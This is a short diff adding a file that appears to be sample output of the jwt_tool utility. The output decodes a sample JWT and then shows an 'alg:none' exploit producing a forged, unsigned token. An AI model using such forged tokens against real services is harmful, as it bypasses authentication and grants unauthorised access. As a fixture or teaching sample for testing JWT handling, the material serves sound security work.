@@ -1,0 +1,13 @@
+Original JWT:
+
+jwt_tool version 2.2.6
+
+Token header values:
+[+] alg = "HS256"
+
+Decoded Token Values:
+[+] sub = "1234567890"
+
+[+] alg:none Exploit
+Your new forged token:
+[+] eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
